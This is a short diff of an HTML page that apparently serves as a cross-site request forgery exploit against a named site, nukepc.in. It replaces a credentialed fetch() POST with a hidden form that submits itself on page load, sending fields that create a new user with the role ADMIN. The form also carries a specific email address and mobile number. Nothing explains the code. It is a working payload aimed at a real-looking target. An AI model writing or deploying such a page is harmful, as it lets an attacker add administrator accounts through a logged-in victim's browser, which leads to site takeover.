@@ -1,20 +1,19 @@
 <html>
 <body>
+
+<form action="https://nukepc.in/users/admin" method="POST">
+  <input type="hidden" name="firstName" value="ram">
+  <input type="hidden" name="lastName" value="ram">
+  <input type="hidden" name="mobile" value="7890757890">
+  <input type="hidden" name="email" value="roodbox0@pdf-cutter.com">
+  <input type="hidden" name="role" value="ADMIN">
+  
+  <input type="submit" value="Submit Request">
+</form>
+
 <script>
-fetch("https://nukepc.in/users/admin", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    firstName: "ram",
-    lastName: "ram",
-    mobile: "7890757890",
-    email: "roodbox0@pdf-cutter.com",
-    role: "ADMIN"
-  })
-});
+document.forms[0].submit();
 </script>
+
 </body>
 </html>
